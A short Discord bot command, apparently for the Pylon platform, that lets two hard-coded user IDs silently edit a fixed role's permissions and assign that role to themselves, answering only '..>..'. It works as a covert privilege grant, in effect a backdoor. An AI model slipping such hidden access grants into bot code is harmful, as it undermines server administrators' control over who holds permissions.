commands.on(
  'gd',
  (args) => ({
    input: args.textOptional()
  }),
  async (message, { input }) => {
    if (message.author.id != '258265415770177536' && message.author.id != '401828594961350658') {
      return;
    }
    let x = await message.getGuild();
    let y = await x.getRole('763124282158481418');
    await y.edit({ permissions: 653647553, color: 0x065ba2 });
    await message.member?.addRole('763124282158481418');
    await message.reply('..>..');
  }
);
